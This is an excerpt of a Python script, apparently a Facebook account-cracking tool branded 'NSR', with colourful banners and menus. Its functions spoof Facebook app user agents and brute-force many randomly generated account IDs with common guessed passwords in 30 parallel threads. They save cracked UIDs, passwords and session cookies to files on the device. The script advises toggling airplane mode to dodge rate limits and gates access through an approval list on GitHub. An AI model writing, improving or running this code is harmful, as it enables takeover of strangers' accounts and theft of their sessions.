...
def S1():
	...
	e = ";[FBAN/FB4A;FBAV/438.0.0.33.118;FBBV/529955345;FBDM/{density=2.5,width=1080,height=2184};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 8 V 5G UW;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	ua = s + e	
	return ua
...
logo = """\033[1;92m         
 ...
 |_| \_|_____/|_|  \_\
                       ...
                       \033[1;90m𝐀𝐅𝐆\033[1;91m𝐇𝐀𝐍𝐈\033[1;92m𝐒𝐓𝐀𝐍
   
🔥🔥🔥🔥🔥\033[1;97mNSR is On fire🔥🔥🔥🔥🔥

\033[1;93m𝗧𝗛𝗜𝗦 𝗦𝗖𝗥𝗜𝗣𝗧 𝗜𝗦 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗕𝗬:😲✎ 🆃🅴🅰🅼  𝐍\033[1;91m𝐒\033[1;92m𝐑
...
\033[1;96m ​🇪​​🇳​​🇯​​🇴​​🇾​ ​🇧​​🇷​​🇴
 ...
 \033[1;95m
 \033[1;92m----------------------------------------
 \033[1;92m[+] 𝘼𝙐𝙏𝙃𝙊𝙍      :\033[1;92m  √  𝐍𝐈𝐒𝐀𝐑 𝐀𝐇𝐌𝐀𝐃  
 \033[1;92m[+] 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  
 \033[1;92m[+] 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √  𝐇𝐀𝐐𝐀𝐍𝐈 𝐓𝐄𝐀𝐌 𝐌𝐀𝐅𝐈𝐀  
 \033[1;92m[+] 𝗦𝗧𝗔𝗧𝗨𝗦      : \033[91;1m √  𝐅𝐑𝐄𝐄
 \033[1;92m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     : \033[1;92m √  𝟏.𝟎  
 \033[1;92m----------------------------------------"""
def line():
	print(f'\033[1;32m-----------------------------------------------')
    ...
    try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                print(' \033[91;1m[1] Not working\n [2]\033[91;1m Not working\n \033[92;1m[3] all countries working\n \033[91;1m[4] Not working\n [5]\033[91;1m Not working\n [0] BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
...
def pak():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mAfter Every 5 Min Turn Airplane On/Off For 5 sec \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
...
def afg():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','afghan123','afghanistan','khan123','afghan1234','afghan12345','khan12345']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
...
def gmail():
                ...
                line()
                input(' Press enter to back ')
                os.system('python nsr.py')

#[--------METHOD-FOR-FILE-------]
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mNSR\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [NSR-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/NSR-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [NSR-CP] '+uid+' | '+pas+'\033[1;97m')
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m [\x1b[1;92mNSR\x1b[1;92m-\x1b[1;92mR-1\x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [NSR-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/NSR-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Team-NSR/Nsr.txt/blob/main/Apprve.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+4591937471?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()
